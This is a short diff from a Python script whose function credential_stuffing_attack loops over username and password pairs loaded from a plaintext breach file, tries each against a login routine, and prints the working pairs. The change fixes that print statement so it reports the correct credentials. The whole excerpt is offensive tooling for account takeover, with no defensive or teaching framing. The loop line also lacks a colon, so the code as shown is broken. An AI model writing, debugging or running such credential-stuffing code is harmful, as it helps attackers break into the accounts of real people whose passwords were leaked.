@@ -25,7 +25,7 @@ def credential_stuffing_attack(creds):
     for i in range(creds.size[0])
         stat = attempt_login(creds[i,0],creds[i,1])
         if stat:
-            print("Success. User: ", creds[0], "Pass: ",creds[1])
+            print("Success. User: ", creds[i,0], "Pass: ",creds[i,1])
 
 def main():
     creds = load_breach(PLAINTEXT_BREACH_PATH)
